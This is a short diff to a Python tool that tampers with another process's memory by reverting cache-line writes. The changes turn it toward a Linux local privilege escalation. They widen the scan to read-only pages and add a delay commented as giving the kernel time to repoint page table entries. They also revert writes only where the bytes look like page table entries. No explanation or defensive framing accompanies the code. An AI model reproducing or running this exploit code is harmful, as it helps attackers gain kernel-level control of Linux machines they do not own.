@@ -5,6 +5,7 @@ Note: this does not accurately simulate caching effects
 import re
 import random
 import logging
+import time
 from typing import List, BinaryIO
 
 logger = logging.getLogger(__name__)
@@ -23,7 +24,7 @@ def enumerate_rw_pages(pid: int) -> List[int]:
 			)
 			assert match is not None
 			start_hex, end_hex, perms = match.groups()
-			if not perms.startswith("rw"):
+			if not perms.startswith("r"):
 				continue
 			start, end = int(start_hex, 16), int(end_hex, 16)
 			for i in range(start, end, PAGE_SIZE):
@@ -38,7 +39,7 @@ def block_a_write(mem: BinaryIO, pages: List[int]) -> bool:
 			try:
 				mem.seek(page)
 				a = mem.read(PAGE_SIZE)
-				#time.sleep(0.001)
+				time.sleep(0.001)  # for linux LPE, give time for kernel to repoint the PTEs
 				mem.seek(page)
 				b = mem.read(PAGE_SIZE)
 			except OSError:
@@ -54,10 +55,22 @@ def block_a_write(mem: BinaryIO, pages: List[int]) -> bool:
 			
 			# revert a random cl
 			i = random.choice(dirty_cls)
-			mem.seek(page + i)
-			mem.write(a[i:i+CACHE_LINE_SIZE])
-			logger.info(f"Blocked a write at {hex(page+i)}")
-			return True
+
+			print("before: ", a[i:i+CACHE_LINE_SIZE].hex())
+			print("after:  ", b[i:i+CACHE_LINE_SIZE].hex())
+
+			if a[i] == 0x27 and b[i] == 0x27:  # looks like PTEs
+				print("reverting to 'before'")
+				mem.seek(page + i)
+				mem.write(a[i:i+CACHE_LINE_SIZE])
+				return True
+			#logger.info(f"Blocked a write at {hex(page+i)}")
+			
+			#time.sleep(0.01)
+			#mem.seek(page)
+			#c = mem.read(PAGE_SIZE)
+			#print("new:      ", c[i:i+CACHE_LINE_SIZE].hex())
+			#return True
 
 	logger.error("Failed to block a write, giving up.")
 	return False
